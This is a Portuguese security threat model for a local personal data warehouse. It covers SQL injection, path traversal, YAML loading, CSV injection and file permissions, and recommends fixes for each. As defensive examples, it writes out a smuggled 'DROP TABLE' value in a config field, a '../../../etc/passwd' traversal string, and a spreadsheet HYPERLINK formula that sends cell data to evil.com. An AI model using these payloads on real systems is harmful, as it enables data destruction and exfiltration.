# SECURITY.md
## Personal Data Warehouse — Modelo de Ameaças e Guia de Segurança
### Versão 10.1.0

---

## 1. Contexto de Segurança

O PDW é um sistema **batch pessoal** executado localmente. Não há:
- Servidor HTTP / endpoints de rede expostos
- Autenticação de usuários
- Sessões ou tokens
- Comunicação com internet

O modelo de ameaças é restrito ao ambiente local: arquivos de entrada maliciosos, permissões de sistema de arquivos e injeção de SQL via dados do Excel.

---

## 2. Superfície de Ataque

```
┌──────────────────────────────────────────────────────┐
│                  Superfície de Ataque                │
├──────────────────────────────────────────────────────┤
│  1. Arquivo Excel de entrada (PDW.xlsx)              │ ← PRINCIPAL
│  2. Arquivo de configuração (.cfg)                   │ ← LOCAL
│  3. Arquivo YAML de queries (PDW_QUERIES.yaml)       │ ← LOCAL
│  4. Banco SQLite gerado (PDW.db)                     │ ← OUTPUT
│  5. Caminhos de diretórios no .cfg                   │ ← TRAVERSAL
└──────────────────────────────────────────────────────┘
```

---

## 3. Vulnerabilidades Identificadas

### 3.1 SQL Injection — CRÍTICO

**Localização**: `pdw/etl/sanitizer.py` — função `data_correjeitor`

**Descrição**: Queries SQL são construídas por concatenação/f-string com nomes de tabela e coluna provenientes do arquivo `.cfg` e da planilha GUIDING. Se um usuário malicioso controlar esses valores, pode executar SQL arbitrário.

**Exemplo de código vulnerável**:
```python
# Vulnerável — table name concatenado diretamente
cursor.execute("DROP TABLE IF EXISTS " + table_name)

# Vulnerável — f-string com variável
cursor.execute(f"SELECT * FROM {general_entries_table}")
```

**Vetor de ataque**:
```ini
# cfg malicioso:
GENERAL_ENTRIES_TABLE = LANCAMENTOS_GERAIS; DROP TABLE TiposLancamentos; --
```

**Impacto**: Destruição de dados no banco SQLite local. Não há exfiltração remota.

**Mitigação atual**: Nenhuma — os nomes vêm do .cfg controlado pelo usuário local.

**Recomendação para reescrita**:
```python
# Use allowlist de nomes de tabela válidos
ALLOWED_TABLES = {'LANCAMENTOS_GERAIS', 'TiposLancamentos', 'PARCELAMENTOS', 'GUIDING'}
if table_name not in ALLOWED_TABLES:
    raise ValueError(f"Table name not allowed: {table_name}")

# Para identificadores, use aspas duplas (SQLite)
cursor.execute(f'SELECT * FROM "{table_name}"')  # mitiga parcialmente

# Melhor: validar com regex
import re
if not re.match(r'^[A-Za-z_][A-Za-z0-9_]*$', table_name):
    raise ValueError("Invalid table name")
```

---

### 3.2 SQL Injection via Dados do Excel — ALTO

**Localização**: `pdw/etl/sanitizer.py` — `data_correjeitor`

**Descrição**: Valores de células do Excel (DESCRICAO, TIPO) são usados em queries SQL via `data_correjeitor`. A função `clean_description_text` remove apenas `;,` e alguns caracteres específicos, mas não sanitiza para SQL.

**Mitigação atual**: `pandas.DataFrame.to_sql()` usa parameterized queries internamente — **seguro**. O risco está nas queries manuais com `cursor.execute()`.

**Exemplo de query manual vulnerável**:
```python
# Se alguma query manual usar valor de célula diretamente:
cursor.execute(f"UPDATE table SET col = '{value_from_excel}'")  # VULNERÁVEL
```

**Recomendação**: Sempre usar parâmetros posicionais:
```python
cursor.execute("UPDATE table SET col = ?", (value_from_excel,))
```

---

### 3.3 Path Traversal — MÉDIO

**Localização**: `pdw/config/loader.py` — construção de caminhos de arquivo

**Descrição**: Caminhos de arquivo são construídos por concatenação simples de strings, sem normalização ou validação de traversal (`../`).

**Exemplo**:
```python
input_file = dir_file_in + in_file + '.' + in_type
# Se dir_file_in = "/safe/" e in_file = "../../../etc/passwd"
# → input_file = "/safe/../../../etc/passwd" → "/etc/passwd"
```

**Impacto**: Leitura de arquivos fora do diretório esperado. Limitado a arquivos legíveis pelo usuário que executa o processo.

**Mitigação atual**: Nenhuma validação de traversal.

**Recomendação**:
```python
import os
resolved = os.path.realpath(input_file)
expected_prefix = os.path.realpath(dir_file_in)
if not resolved.startswith(expected_prefix):
    raise ValueError(f"Path traversal detected: {input_file}")
```

---

### 3.4 Execução de Código via YAML — MÉDIO

**Localização**: `pdw/reports/xlsx_generator.py` — leitura do YAML de queries

**Descrição**: O arquivo YAML é lido com `yaml.safe_load()` (comportamento do PyYAML padrão com `pyyaml >= 5.1`). Mas se por qualquer razão `yaml.load()` for usado sem `Loader=yaml.SafeLoader`, um arquivo YAML malicioso pode executar código Python.

**Status atual**: Assumindo uso correto de `yaml.safe_load()` — **seguro**.

**Verificação**:
```bash
grep -n "yaml.load\b" pdw/reports/xlsx_generator.py
# Deve retornar vazio ou apenas yaml.safe_load
```

**Recomendação**: Sempre explicitar `yaml.safe_load()`, nunca `yaml.load()`.

---

### 3.5 Injeção via Fórmulas Excel (CSV Injection) — BAIXO

**Localização**: Exportação CSV em `pdw/reports/exporter.py`

**Descrição**: Se um campo DESCRICAO no banco começar com `=`, `+`, `-`, `@`, uma célula CSV exportada pode ser interpretada como fórmula por aplicações spreadsheet (ex: Excel, LibreOffice).

**Exemplo malicioso** em DESCRICAO:
```
=HYPERLINK("http://evil.com/"&A1,"Click")
```

**Impacto**: Afeta apenas quem abre o CSV exportado em um spreadsheet, não o sistema PDW em si.

**Recomendação**: Prefixar campos potencialmente maliciosos com `'` ou `\t`:
```python
def sanitize_csv_value(value):
    if isinstance(value, str) and value and value[0] in ('=', '+', '-', '@'):
        return "'" + value
    return value
```

---

### 3.6 Permissões de Arquivo — BAIXO

**Descrição**: O banco SQLite e os relatórios são criados sem definição explícita de permissões. As permissões herdam o `umask` do processo.

**Risco**: Em sistemas multi-usuário, outros usuários podem ler dados financeiros se `umask` for permissivo (ex: `0022` → arquivos com permissão `644`).

**Recomendação**:
```python
import os
os.chmod(sqlite_database, 0o600)  # apenas dono pode ler/escrever
os.chmod(report_file, 0o600)
```

---

## 4. Tabela de Risco Consolidada

| ID | Vulnerabilidade | Severidade | Exploração | Impacto | Mitigado? |
|---|---|---|---|---|---|
| SEC-01 | SQL Injection via .cfg | CRÍTICO | Local | Destruição de dados | Não |
| SEC-02 | SQL Injection via Excel | ALTO | Local + arquivo | Destruição de dados | Parcial (to_sql é seguro) |
| SEC-03 | Path Traversal | MÉDIO | Local | Leitura indevida | Não |
| SEC-04 | Execução via YAML | MÉDIO | Arquivo | Execução de código | Sim (safe_load) |
| SEC-05 | CSV Injection | BAIXO | Arquivo externo | XSS em spreadsheet | Não |
| SEC-06 | Permissões de arquivo | BAIXO | Multi-usuário | Leitura de dados financeiros | Não |

---

## 5. Modelo de Confiança

```
[Usuário local] ←CONFIÁVEL→ [.cfg] ←CONFIÁVEL→ [PDW]
[Usuário local] ←CONFIÁVEL→ [YAML] ←CONFIÁVEL→ [PDW]
[Dados Excel]   ←NÃO CONFIÁVEL→ [ETL] ←SANITIZAR→ [SQLite]
[SQLite output] ←NÃO COMPARTILHAR→ [outros usuários]
```

**Premissa de segurança atual**: O arquivo `.cfg` e o `.yaml` são controlados pelo mesmo usuário que executa o sistema. Dados do Excel são tratados como input externo.

---

## 6. Recomendações para Reescrita (cross-language)

### 6.1 Uso obrigatório de Prepared Statements

Em **qualquer** linguagem alvo:

```java
// Java — PreparedStatement
PreparedStatement ps = conn.prepareStatement("SELECT * FROM ? WHERE Data > ?");
// ERRO: identificadores (nomes de tabela) NÃO podem ser parametrizados em SQL
// Use allowlist explícita para nomes de tabela
```

```rust
// Rust — rusqlite com params!
conn.execute("INSERT INTO entries (data, tipo) VALUES (?1, ?2)", params![data, tipo])?;
```

```go
// Go — database/sql
rows, err := db.Query("SELECT * FROM LANCAMENTOS_GERAIS WHERE strftime(?, Data) = ?", "%Y", year)
```

### 6.2 Validação de Nomes de Tabela

```python
# Python — allowlist
VALID_TABLE_NAMES = frozenset({
    'LANCAMENTOS_GERAIS', 'TiposLancamentos', 'PARCELAMENTOS',
    'GUIDING', 'PARCELAMENTOS', 'HistoricoGeral', 'HistoricoAnual',
})

def validate_table_name(name: str) -> str:
    if name not in VALID_TABLE_NAMES:
        raise ValueError(f"Invalid table name: {name!r}")
    return name
```

### 6.3 Validação de Caminhos

```python
def safe_path(base_dir: str, filename: str) -> str:
    safe = os.path.realpath(os.path.join(base_dir, filename))
    if not safe.startswith(os.path.realpath(base_dir)):
        raise ValueError("Path traversal")
    return safe
```

---

## 7. Dados Sensíveis

Os arquivos gerados pelo PDW contêm **dados financeiros pessoais sensíveis**:

| Arquivo | Contém | Proteção recomendada |
|---|---|---|
| `PDW.xlsx` (entrada) | Todos os lançamentos financeiros | Não commitar em repositório público |
| `PDW.db` (banco) | Todos os dados processados | `chmod 600`, não commitar |
| `PDW_REPORTS.v2.xlsx` | Sumários e análises financeiras | `chmod 600` |
| `*.csv`, `*.json.gz`, `*.xml.gz` | Exportações completas de lançamentos | `chmod 600` |
| `*.log` | Timestamps de execução, hostname | Baixo risco |

**Recomendação**: Adicionar ao `.gitignore`:
```
PDW.xlsx
PDW.db
PDW_REPORTS*.xlsx
*.csv
*.json.gz
*.xml.gz
*.log
```

---

## 8. Histórico de Incidentes de Segurança

| Versão | Incidente | Resolução |
|---|---|---|
| Pré-10.1.0 | `transient_data_exportator` importava `datetime` ausente → possível falha silenciosa | Corrigido em 10.1.0 |
| Qualquer | Nenhum incidente de segurança reportado | — |
